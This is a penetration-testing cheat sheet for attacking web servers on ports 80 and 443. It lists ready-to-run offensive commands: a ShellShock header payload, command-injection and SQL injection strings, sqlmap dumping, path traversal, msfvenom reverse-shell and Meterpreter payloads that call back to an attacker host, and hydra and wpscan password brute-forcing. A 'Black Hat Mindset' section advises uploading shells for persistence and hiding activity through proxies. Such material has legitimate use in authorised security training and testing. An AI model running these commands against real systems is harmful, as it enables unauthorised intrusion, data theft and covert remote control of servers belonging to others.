# Basic Methodology - Port 80, 443 (HTTP-HTTPS)

This README explores exploiting HTTP and HTTPS services, covering source code analysis, file uploads, directory busting, vulnerability scanning, command execution, SQL injection, and more.
## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Source Code Analysis](#source-code-analysis)
- [Checking Request Methods](#checking-request-methods)
- [Uploading Files](#uploading-files)
- [Discovering Non-Indexed Webpages](#discovering-non-indexed-webpages)
- [Investigating the Web Server](#investigating-the-web-server)
- [Directory Busting](#directory-busting)
- [ShellShock Exploitation](#shellshock-exploitation)
- [Vulnerability Scanning](#vulnerability-scanning)
- [SSL/TLS Analysis](#ssltls-analysis)
- [WebDAV Testing](#webdav-testing)
- [Proxy Interception with Burp Suite](#proxy-interception-with-burp-suite)
- [Default Credentials](#default-credentials)
- [Command Execution](#command-execution)
- [SQL Injection](#sql-injection)
- [Local/Remote File Inclusion (LFI/RFI)](#localremote-file-inclusion-lfirfi)
- [Reverse Shell File Upload](#reverse-shell-file-upload)
- [Image Metadata Analysis](#image-metadata-analysis)
- [Brute-Force Attacks](#brute-force-attacks)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

HTTP (port 80) and HTTPS (port 443) are the backbone of web communication, often exposing vulnerabilities like misconfigured servers, weak credentials, or injectable code. This guide covers a wide range of techniques to enumerate and exploit web servers, from basic reconnaissance to advanced attacks like SQL injection and reverse shell uploads.

## Setup and Prerequisites

### Environment
- Linux host with network access to the target web server
- Firefox for proxy setup

### Tools
Install:
- `curl`, `gobuster`, `dirb`, `nikto`, `wpscan`, `joomscan`
- `sslyze`, `sslscan`, `davtest`, `sqlmap`, `exiftool`, `hydra`
- `msfvenom`, and Burp Suite
- Optionally, set up a SOCKS proxy (e.g., via Tor)

### Wordlists
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/wordlists/rockyou.txt`
- Custom lists (e.g., `usernames.txt`, `passwords.txt`)

### Requirements
- IP Address/URL: Identify the target (e.g., `<IP address>` or `<URL>`)
- Dependencies: Ensure Go is installed for custom directory busting scripts (`go run main.go`)

## Source Code Analysis

Inspect the web page's source code for hidden comments or credentials.

Right-Click -> View Page Source: Open the browser, navigate to the target URL (e.g., `http://<IP address>`), right-click, and select "View Page Source" to inspect HTML, JavaScript, or inline comments.

## Checking Request Methods

Identify supported HTTP methods for potential file uploads.

```bash
# Uses curl to query supported HTTP methods on the target server
curl -v -X OPTIONS <IP address>
```

Look for PUT in the response (e.g., `Allow: GET, POST, PUT`), indicating file upload capability.

## Uploading Files

Upload files to the server if PUT is supported.

```bash
# Uploads test.txt to the target server using curl
curl http://<IP address> --upload-file test.txt
```

Verify upload by accessing `http://<IP address>/test.txt`.

## Discovering Non-Indexed Webpages

Find hidden pages or directories via robots.txt.

Access `http://<IP address>/robots.txt` to identify disallowed paths (e.g., `/admin`, `/backup`) that may lead to sensitive content.

## Investigating the Web Server

Probe for common web pages to understand the server's structure:

- `http://<IP address>/index.html` - Checks for a default HTML page
- `http://<IP address>/index.php` - Checks for a PHP-based homepage, indicating a PHP backend

## Directory Busting

Enumerate directories and files on the web server.

```bash
# Using gobuster
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP address/URL> -t 250 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html

# Using custom Go script
go run main.go -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP address/URL> -t 100 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html

# Using SOCKS5 proxy
go run main.go -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP address/URL> -p socks5://127.0.0.1:9050 -t 100 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html

# Using dirb with SOCKS4 proxy
dirb <IP address/URL> -p socks4://127.0.0.1:9050
```

**Dirbuster GUI**: Launch Dirbuster, set the target URL, wordlist, and extensions, then start the scan.

## ShellShock Exploitation

Target CGI scripts vulnerable to ShellShock.

### Check for CGI scripts:
- `cgi-bin/user.sh`
- `cgi-bin/test.cgi`

### Test for ShellShock:
```bash
# Attempt to exploit ShellShock via User-Agent header
curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'" http://<IP address>/cgi-bin/user.sh
```

## Vulnerability Scanning

Scan for web server vulnerabilities.

```bash
# Basic Nikto scan
nikto -h <IP address>

# WordPress scanning
wpscan --url <WordPress URL> -e u,ap
wpscan --url <WordPress URL> -e u,ap,at,cb,dbe

# Joomla scanning
joomscan -u <Joomla URL> -ec
```

## SSL/TLS Analysis

Assess the HTTPS server's SSL/TLS configuration.

```bash
# Using sslyze
sslyze --regular <IP address>

# Using sslscan
sslscan <IP address>
```

## WebDAV Testing

Test for WebDAV vulnerabilities.

```bash
davtest -url http://<IP address>
```

## Proxy Interception with Burp Suite

Intercept and manipulate HTTP/HTTPS traffic.

### Setup:
1. Open Burp Suite
2. Go to Preferences -> Advanced -> Network -> Connection Settings -> Manual Proxy Configuration
3. Set Firefox proxy to `127.0.0.1:8080`
4. In Burp, turn on Intercept in the Proxy tab
5. Right-click a captured request and select "Forward to Repeater" for manual testing

## Nmap NSE Scripts

Scan for HTTP/HTTPS vulnerabilities using Nmap's scripting engine.

```bash
# List HTTP-related NSE scripts
ls -la /usr/share/nmap/scripts | grep "http"

# Example usage
nmap -p 80,443 --script http-enum <IP address>
nmap -p 80,443 --script http-vuln* <IP address>
```

## Default Credentials

Test for default credentials:
- Username: `admin`
- Password: `admin`
- Search: Use Google to find default credentials for identified software (e.g., WordPress, Joomla)

## Command Execution

Inject commands to execute on the server:
- `127.0.0.1; uname -a` - Attempts command execution by appending a command
- `127.0.0.1 && uname -a` - Alternative syntax for command injection

## SQL Injection

Exploit SQL vulnerabilities manually or with tools.

```bash
# Basic SQL injection payload
' or 1=1 #

# Using sqlmap with cookie
sqlmap --url=<IP address> --cookie="PHPSESSID=nce5aar41js59p2ber5es3mr2l" --dbms=mysql --level=3 --risk=3

# Testing POST request
sqlmap --data="search=OSINT" --url=http://192.168.1.160/welcome.php --cookie="PHPSESSID=nce5aar41js59p2ber5es3mr2l" --dump

# Using Burp Suite Request
vi login.req  # Save the request to login.req
sqlmap -r login.req
```

## Local/Remote File Inclusion (LFI/RFI)

Exploit file inclusion vulnerabilities.

Example:
```
http://10.11.14.113/addguestbook.php?name=James&comment=Hello&LANG=../../../../../../../../../../etc/hosts
```

## Reverse Shell File Upload

Upload reverse shells for remote access.

```bash
# Download and modify PentestMonkey Shell
# From http://pentestmonkey.net/tools/web-shells/php-reverse-shell

# Create PHP reverse shell
msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php

# Create PHP Meterpreter shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php

# Create ASP Meterpreter shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp

# Create ASPX Meterpreter shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx

# Create JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.jsp

# Create WAR file with JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP address> LPORT=<Port> -f war > shell.war
```

## Image Metadata Analysis

Extract metadata from images for sensitive information.

```bash
exiftool <image>
```

## Brute-Force Attacks

Guess credentials for web applications.

```bash
# Brute-force DVWA GET form
hydra -V -L usernames.txt -P passwords.txt 192.168.1.101 http-get-form '/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security;low;PHPSESSID=1ce2ba52deb9a642ed57a0d34d6c5dfe'

# Brute-force HTTPS POST form
hydra -l none -P rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+Inproc_login=true:Incorrect password" -t 64 -V

# Brute-force WordPress login
wpscan --url http://10.11.1.234/wp-login -v -P ~/<wordlist> -U elliot -t 50
```

## Black Hat Mindset

1. **Start Broad**: Use gobuster and nikto to map the web server and find entry points
2. **Exploit Weaknesses**: Target default credentials, SQL injection, or file inclusion for quick wins
3. **Upload Shells**: Leverage PUT methods or WebDAV to upload reverse shells for persistence
4. **Stay Undetected**: Use proxies (e.g., SOCKS5) and Burp Suite to mask your activity

## Resources

- [Gobuster GitHub](https://github.com/OJ/gobuster)
- [Nikto GitHub](https://github.com/sullo/nikto)
- [WPScan Documentation](https://wpscan.org/documentation)
- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- [msfvenom Guide](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Burp Suite Guide](https://portswigger.net/burp/documentation)

